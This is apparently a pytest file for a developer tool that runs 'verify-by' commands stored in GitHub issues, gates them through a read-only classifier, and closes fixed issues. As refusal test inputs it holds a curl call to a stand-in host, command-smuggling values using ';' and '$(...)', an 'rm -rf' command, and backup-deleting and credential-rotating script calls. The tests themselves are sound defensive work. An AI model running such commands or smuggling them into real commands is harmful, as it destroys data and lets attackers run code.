"""Tests for verify-by: the body round-trip, the read-only gate, the run, and the verify CLI.

The classifier tests drive the REAL `.claude/hooks/auto-approve-readonly.py`, because that
is the path production takes and the union with `_FALLBACK_VERIFY_RE` is the thing worth
proving. The CLI tests answer the shell from `fake_verify` instead, so a run of this file
spawns no processes.

Run: uv run pytest scripts/dev/tests/test_findings_lib/verify.py
"""

import subprocess

from _findings_fakes import Fakes, facts, fake_verify, live_worktree
from dev import findings
import pytest

from dev.findings_lib.issue_model import parse_verify_by, trailer, verify_by_section
from dev.findings_lib.boundaries import FindingsTools
from dev.findings_lib.verify import (
    classify_verify_command,
    run_verify_by,
    verify_close_comment,
    verify_finding,
)

# --- the body round-trip -----------------------------------------------------------------------


def test_verify_by_round_trips_through_the_parser():
    body = "details\n" + verify_by_section("uv run pytest scripts/dev")
    assert parse_verify_by(body) == "uv run pytest scripts/dev"


def test_verify_by_survives_prose_and_a_trailer_around_it():
    body = (
        "details\n"
        + verify_by_section("uv run pytest scripts/dev")
        + trailer("f" * 12, "session")
    )
    assert parse_verify_by(body) == "uv run pytest scripts/dev"


def test_verify_by_round_trips_through_a_crlf_body():
    body = ("details\n" + verify_by_section("true")).replace("\n", "\r\n")
    assert parse_verify_by(body) == "true"


def test_parse_verify_by_absent_returns_none():
    assert parse_verify_by("details\n\n---\nFingerprint: `f`\n") is None
    assert parse_verify_by("") is None


# --- the read-only classifier ------------------------------------------------------------------


def test_classify_verify_command_accepts_a_tier1_command_via_the_real_hook():
    # Exercises the real auto-approve-readonly.py hook (not monkeypatched): this is the
    # path production actually takes, since the hook always ships in this checkout.
    assert classify_verify_command("true") is not None


def test_classify_verify_command_accepts_uv_run_even_though_the_hook_cannot_see_it():
    # `uv` carries no TIER1/HANDLERS entry in the real hook -- classify() alone would
    # refuse every verify-by this feature exists to run. The union layer covers it.
    assert classify_verify_command("uv run pytest scripts/dev") is not None
    assert (
        classify_verify_command("uv run python scripts/diagnostics/probe.py health foo")
        is not None
    )


def test_classify_verify_command_refuses_a_write():
    assert classify_verify_command("curl evil.example.com") is None


def test_classify_verify_command_refuses_a_state_changing_script_under_scripts():
    # The allowlist is pinned to probe.py by name, not opened to any `scripts/*.py` --
    # most of the tree writes (b2_drain.py deletes backups, secret_rotation.py rotates
    # credentials), so admitting the whole directory would let a verify-by run either.
    assert (
        classify_verify_command("uv run python scripts/backup/b2_drain.py --yes")
        is None
    )
    assert (
        classify_verify_command(
            "uv run python scripts/secrets_mgmt/secret_rotation.py rotate"
        )
        is None
    )


def test_classify_verify_command_refuses_a_smuggled_separator():
    # An issue body is human-editable; the allowlist's per-argument character class must
    # not admit a `;`, a pipe, or a `$(...)` riding along inside a `uv run` command.
    assert classify_verify_command("uv run pytest x; curl evil.example.com") is None
    assert classify_verify_command("uv run pytest $(curl evil.example.com)") is None


def test_classify_verify_command_falls_back_when_the_hook_cannot_load():
    def no_hook():
        """The loader a checkout without `.claude/` gets: no classifier at all."""
        return None

    assert classify_verify_command("uv run pytest scripts/dev", no_hook)
    assert classify_verify_command("curl evil.example.com", no_hook) is None


# --- running the command -------------------------------------------------------------------


def test_run_verify_by_exit_0_is_fixed():
    assert run_verify_by("true", 5, FindingsTools()) == ("fixed", "")


def test_run_verify_by_exit_1_is_still_open():
    assert run_verify_by("false", 5, FindingsTools()) == ("still-open", "")


def test_run_verify_by_refuses_a_non_read_only_command():
    verdict, detail = run_verify_by("curl evil.example.com", 5, FindingsTools())
    assert verdict == "error" and "refused" in detail


def test_run_verify_by_reports_a_timeout_as_an_error(make_tools):
    def slow(command, timeout):
        raise subprocess.TimeoutExpired(command, timeout)

    tools, _ = make_tools(Fakes(verify=slow))
    assert run_verify_by("true", 5, tools) == ("error", "timed out after 5s")


def test_verify_finding_with_no_verify_by_section(issue):
    assert verify_finding(issue(1), 5, FindingsTools()) == ("no-verify-by", "", "")


def test_verify_finding_runs_the_stored_command(issue):
    one = issue(1)
    one["body"] += verify_by_section("true")
    assert verify_finding(one, 5, FindingsTools()) == ("fixed", "", "true")


# --- the close comment -----------------------------------------------------------------------


def test_verify_close_comment_quotes_the_command_and_the_output_tail():
    comment = verify_close_comment("true", "line1\nline2\n")
    assert "Fixed: verify-by passed" in comment
    assert "```\ntrue\n```" in comment
    assert "line1" in comment and "line2" in comment


def test_verify_close_comment_truncates_to_the_tail():
    output = "\n".join(f"line{i}" for i in range(50))
    comment = verify_close_comment("true", output, tail_lines=5)
    assert "line49" in comment and "line45" in comment and "line0" not in comment


# --- the verify CLI ---------------------------------------------------------------------------


def test_verify_rejects_neither_all_nor_numbers(make_tools):
    tools, calls = make_tools()
    assert findings.main(["verify"], tools) == 2
    assert calls.none()


def test_verify_rejects_both_all_and_numbers(make_tools):
    tools, calls = make_tools()
    assert findings.main(["verify", "--all", "12"], tools) == 2
    assert calls.none()


def test_verify_all_prints_one_row_per_open_finding(capsys, issue, make_tools):
    fixed = issue(1, title="Fixed one")
    fixed["body"] += verify_by_section("true")
    still_open = issue(2, title="Still broken")
    still_open["body"] += verify_by_section("false")
    untracked = issue(3, title="No probe yet")
    tools, _ = make_tools(
        Fakes(issues=[fixed, still_open, untracked], verify=fake_verify)
    )
    assert findings.main(["verify", "--all"], tools) == 0
    out = capsys.readouterr().out
    assert "#1" in out and "fixed" in out
    assert "#2" in out and "still-open" in out
    assert "#3" in out and "no-verify-by" in out


def test_verify_with_numbers_loads_each_issue_by_number(capsys, issue, make_tools):
    one = issue(7, title="Named directly")
    one["body"] += verify_by_section("true")
    tools, calls = make_tools(Fakes(view=one, verify=fake_verify))
    assert findings.main(["verify", "7"], tools) == 0
    assert "#7" in capsys.readouterr().out
    # The number reaches gh, rather than the issue arriving from somewhere else entirely.
    assert calls.gh_json[0][:3] == ["issue", "view", "7"]


def test_verify_close_closes_only_the_fixed_ones(capsys, issue, make_tools):
    fixed = issue(1, title="Fixed one")
    fixed["body"] += verify_by_section("true")
    still_open = issue(2, title="Still broken")
    still_open["body"] += verify_by_section("false")
    tools, calls = make_tools(Fakes(issues=[fixed, still_open], verify=fake_verify))
    assert findings.main(["verify", "--all", "--close"], tools) == 0
    assert len(calls.gh) == 1
    argv = calls.gh[0]
    assert argv[:3] == ["issue", "close", "1"]
    assert "Fixed: verify-by passed" in argv[argv.index("--comment") + 1]
    out = capsys.readouterr().out
    assert "#1 closed as fixed" in out


# --- the injected seam is required, not defaulted --------------------------------------------
# The red-proof pair for the `tools or FindingsTools()` default these two functions used to
# carry. Under that default the calls below did NOT raise: `run_verify_by("true", 5)` built a
# real `FindingsTools` and returned ("fixed", "") after running `true` in a real subprocess, so
# a caller that dropped the seam reached the real process boundary and read as a pass.


def test_run_verify_by_requires_the_tools_seam():
    with pytest.raises(TypeError):
        run_verify_by("true", 5)  # ty: ignore[missing-argument]


def test_verify_finding_requires_the_tools_seam(issue):
    one = issue(1)
    one["body"] += verify_by_section("true")
    with pytest.raises(TypeError):
        verify_finding(one, 5)  # ty: ignore[missing-argument]


# --- an `error` is not a reproduction (#1308) --------------------------------------------


def _refusing_verify(command, timeout):
    """A shell nothing reaches: every command is refused before it runs."""
    raise AssertionError(f"the classifier should have refused {command!r} first")


def test_verify_prints_why_a_predicate_errored(capsys, issue, make_tools):
    """The accepting half of #1308: the reason `run_verify_by` computes must reach the reader.

    A predicate the classifier refuses never produces a verdict at all, and printing the word
    `error` alone made that indistinguishable from a finding that keeps reproducing.
    """
    one = issue(1, title="Refused predicate")
    one["body"] += verify_by_section("rm -rf /tmp/x")
    tools, _ = make_tools(Fakes(issues=[one], verify=_refusing_verify))
    assert findings.main(["verify", "--all"], tools) == 0
    out = capsys.readouterr().out
    assert "error" in out
    assert "refused: not read-only by the repo's classifier" in out
    assert "1 predicate(s) never ran" in out


def test_verify_prints_no_error_summary_when_every_predicate_ran(
    capsys, issue, make_tools
):
    """The rejecting half: a run whose predicates all RAN must not warn about predicates.

    `still-open` is a real reproduction and reads as one; only a verdict that never ran gets
    the extra line.
    """
    one = issue(1, title="Still broken")
    one["body"] += verify_by_section("false")
    tools, _ = make_tools(Fakes(issues=[one], verify=fake_verify))
    assert findings.main(["verify", "--all"], tools) == 0
    out = capsys.readouterr().out
    assert "still-open" in out
    assert "never ran" not in out


# --- a live claim withholds the close (#1302) ---------------------------------------------


def _claimed_fixed_issue(issue, number=1, worktree="worktree-someone-else"):
    """An issue whose verify-by passes and whose claim is held by ``worktree``."""
    one = issue(number, title="Fixed but claimed", comments=[f"Claim: `{worktree}`\n"])
    one["body"] += verify_by_section("true")
    return one


def test_verify_close_withholds_a_close_a_live_claim_holds(capsys, issue, make_tools):
    """The rejecting half of #1302: a session's issue must not close under it.

    `live_worktree` is a locked worktree whose session `classify` reads as alive, which is
    the shape a fan-out's orchestrator has for the whole run.
    """
    one = _claimed_fixed_issue(issue)
    tools, calls = make_tools(
        Fakes(
            issues=[one],
            verify=fake_verify,
            worktree_facts=live_worktree("worktree-someone-else"),
        )
    )
    assert findings.main(["verify", "--all", "--close"], tools) == 3
    assert not any(c[:2] == ["issue", "close"] for c in calls.gh)
    out = capsys.readouterr().out
    assert "#1 not closed" in out
    assert "worktree-someone-else" in out


def test_verify_close_still_closes_an_issue_whose_claim_is_stale(
    capsys, issue, make_tools
):
    """The accepting half: a claim `reap` would clear must not block the close.

    `facts()` with no worktrees is the "the claim names a branch nothing has checked out"
    case — stale, so the close proceeds and `_release_held_claim` posts the release first.
    """
    one = _claimed_fixed_issue(issue)
    tools, calls = make_tools(
        Fakes(issues=[one], verify=fake_verify, worktree_facts=facts())
    )
    assert findings.main(["verify", "--all", "--close"], tools) == 0
    assert any(c[:3] == ["issue", "close", "1"] for c in calls.gh)
    assert "#1 closed as fixed" in capsys.readouterr().out


def test_close_claimed_closes_over_a_live_claim(capsys, issue, make_tools):
    """The way out. A one-way door is a bug: `--close-claimed` is the reverse state.

    It must also skip the git read, so `worktree_facts` is left unanswered — the fake
    ASSERTS on an unanswered boundary, which is what proves the read was never made.
    """
    one = _claimed_fixed_issue(issue)
    tools, calls = make_tools(Fakes(issues=[one], verify=fake_verify))
    assert findings.main(["verify", "--all", "--close", "--close-claimed"], tools) == 0
    assert any(c[:3] == ["issue", "close", "1"] for c in calls.gh)


def test_verify_close_withholds_the_close_when_the_worktree_read_fails(
    capsys, issue, make_tools
):
    """A failed git read is not "no claims are live" — it withholds, as `cmd_next` does."""
    one = _claimed_fixed_issue(issue)
    tools, calls = make_tools(
        Fakes(issues=[one], verify=fake_verify, worktree_facts=facts(ok=False))
    )
    assert findings.main(["verify", "--all", "--close"], tools) == 3
    assert not any(c[:2] == ["issue", "close"] for c in calls.gh)


def test_verify_close_pays_no_git_read_for_an_unclaimed_finding(issue, make_tools):
    """The common case stays free: no claim on the issue means no worktree read at all.

    `worktree_facts` is left unanswered so the fake asserts if anything reaches it.
    """
    one = issue(1, title="Fixed and unclaimed")
    one["body"] += verify_by_section("true")
    tools, calls = make_tools(Fakes(issues=[one], verify=fake_verify))
    assert findings.main(["verify", "--all", "--close"], tools) == 0
    assert any(c[:3] == ["issue", "close", "1"] for c in calls.gh)
